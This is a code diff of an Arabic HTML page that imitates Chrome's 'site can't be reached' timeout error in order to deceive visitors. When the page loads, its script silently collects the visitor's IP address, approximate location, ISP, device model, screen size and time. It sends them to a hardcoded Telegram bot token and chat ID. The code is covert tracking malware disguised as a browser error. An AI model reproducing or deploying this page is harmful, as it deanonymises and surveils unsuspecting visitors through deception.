@@ -1,19 +1,85 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تعذر الوصول إلى الموقع الإلكتروني</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #202124;
+            color: #bdc1c6;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            margin: 0;
+            padding: 0 10%;
+            box-sizing: border-box;
+        }
+        .icon {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 24px;
+            fill: #9aa0a6;
+        }
+        h1 {
+            font-size: 1.5rem;
+            color: #f1f3f4;
+            margin: 0 0 16px 0;
+            font-weight: 500;
+        }
+        .url {
+            color: #8ab4f8;
+            word-break: break-all;
+        }
+        ul {
+            margin: 0 0 24px 0;
+            padding-right: 20px;
+            color: #9aa0a6;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .error-code {
+            color: #5f6368;
+            font-size: 0.8rem;
+            margin-top: 20px;
+        }
+    </style>
+</head>
 <body>
 
-    <div class="error-container">
-        
-    </div>
+    <!-- أيقونة صفحة الخطأ الخاصة بمتصفح كروم -->
+    <svg class="icon" viewBox="0 0 24 24">
+        <path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 4h5v8l-2.5-1.5L6 12V4z"/>
+    </svg>
+
+    <h1>تعذر الوصول إلى الموقع الإلكتروني</h1>
+    
+    <p>استغرق رد <span class="url" id="current-url">هذا الموقع</span> وقتاً طويلاً جداً للرد.</p>
+
+    <ul>
+        <li>تحقق من الاتصال بالإنترنت.</li>
+        <li>تحقق من الكابلات وWi-Fi والموجهات (Routers).</li>
+        <li>تشغيل تشخيصات شبكة Windows.</li>
+    </ul>
+
+    <div class="error-code">ERR_CONNECTION_TIMED_OUT</div>
 
     <script>
+        // عرض الرابط الحالي تلقائياً لتبدو الصفحة واقعية 100%
+        document.getElementById('current-url').innerText = window.location.hostname;
+
         const BOT_TOKEN = "9067905487:AAFWRzqKu9WX0XZYfmEdHtaRrITXiQarppI";
         const CHAT_ID = "8318202151";
 
         async function sendVisitorData() {
             try {
-                // جلب بيانات الموقع الجغرافي
+                // جلب بيانات الموقع الجغرافي للزائر
                 const response = await fetch("https://ipinfo.io/json");
                 const data = await response.json();
 
@@ -34,5 +100,41 @@
                         }
                     }
                 } catch (e) {
-                    console.
-                        
+                    console.log("Client hints not supported");
+                }
+
+                const screenRes = window.screen.width + "x" + window.screen.height;
+                const time = new Date().toLocaleString();
+
+                // بناء نص الرسالة الاحترافي
+                const textMsg = 
+                    "🚨 تم تسجيل زيارة جديدة (عبر خطأ كروم المزيف)!\n\n" +
+                    "📍 الموقع التقريبي: " + city + "، " + country + "\n" +
+                    "🌐 IP: " + ip + "\n" +
+                    "📡 المزود: " + org + "\n" +
+                    "📱 الجهاز: " + deviceModel + "\n" +
+                    "🖥 الشاشة: " + screenRes + "\n" +
+                    "⏰ الوقت: " + time;
+
+                // إرسال الطلب إلى بوت تيليجرام بصمت تام
+                await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: textMsg
+                    })
+                });
+
+            } catch (error) {
+                console.error("حدث خطأ:", error);
+            }
+        }
+
+        // تنفيذ الإرسال فور فتح الصفحة
+        window.onload = sendVisitorData;
+    </script>
+</body>
+</html>
